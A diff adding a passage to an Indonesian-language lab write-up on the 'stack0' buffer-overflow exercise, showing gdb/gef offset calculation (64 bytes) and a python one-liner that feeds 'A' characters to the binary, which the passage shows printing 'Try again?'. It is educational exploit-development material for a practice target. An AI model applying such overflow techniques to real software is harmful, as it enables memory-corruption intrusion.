@@ -82,4 +82,22 @@ gef➤  x/wx $esp+0x1c
 0xffffcdac:	0x41414141
 ```
 
+Jika kita melihat pada kedua alamat tersebut **0xffffcdec** dan **0xffffcdac**, bukankah mereka terlihat tidak begitu jauh?. Hanya dari *ec* ke *ac*. Mari coba kita hitung seberapa banyak karakter yang diperlukan untuk menimpa alamat variabel modified itu
+
+> p/d 0xffffcdec - 0xffffcdac
+
+```
+gef➤  p/d 0xffffcdec - 0xffffcdac
+$1 = 64
+```
+
+Terlihat bahwa untuk mencapai alamat **0xffffcdec** dibutuhkan 64 karakter
+
+## Mari Kita Cobaa
+Kita dapat menggunakan python untuk menghasilkan 64 karakter tersebut
+```
+python -c "print ('A'*64)" | ./stack0
+Try again?
+```
+
 
